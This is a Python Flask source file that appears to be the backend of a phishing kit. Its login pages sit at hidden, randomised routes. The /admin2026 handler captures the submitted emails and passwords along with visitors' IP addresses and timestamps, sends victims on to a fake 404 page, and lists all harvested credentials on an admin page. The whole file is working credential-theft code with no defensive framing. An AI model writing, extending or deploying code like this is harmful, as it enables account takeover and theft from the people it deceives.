from flask import Flask, render_template, request, redirect, url_for
import datetime as datetime_

app = Flask(__name__)

subscribers = []


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/login15084687")
def login():
    return render_template("login.html")


@app.route("/login28404690046")
def login2():
    return render_template("second_login.html")


@app.route("/login399810026458")
def login3():
    return render_template("third_login.html")


@app.route("/g2465a024c46979")
def gac():
    return render_template("gac.html")


@app.route("/404_redirecting_page746857648894")
def redirecting():
    return render_template("redirecting.html")


@app.route("/admin2026", methods=["POST", "GET"])
def admin2026():
    email = request.form.get("email")
    password = request.form.get("password")
    ip_address = request.remote_addr
    datetime = datetime_.datetime.now()
    subscribers.append(f"Email: {email}, Password: {password}, IP Address: {ip_address}, Datetime: {datetime}")

    if request.method == "POST":
        return redirect(url_for("redirecting"))
        
    else:
        return render_template("admin2026.html", subscribers=subscribers)











if __name__ == "__main__":
    app.run(debug=True, port=5000)